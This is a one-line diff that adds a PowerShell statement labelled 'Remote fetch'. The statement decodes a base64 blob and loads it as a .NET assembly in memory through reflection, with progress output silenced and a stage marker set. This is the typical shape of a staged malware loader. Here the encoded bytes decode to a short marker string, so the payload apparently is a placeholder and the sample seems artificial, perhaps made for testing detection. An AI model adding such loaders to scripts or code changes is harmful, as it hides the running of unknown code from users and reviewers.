@@ -1,0 +1,1 @@
+<# Remote fetch #> $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpwOW9nMnp4aHli"); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); $ProgressPreference = "SilentlyContinue"; $StageMarker = "stage-27"
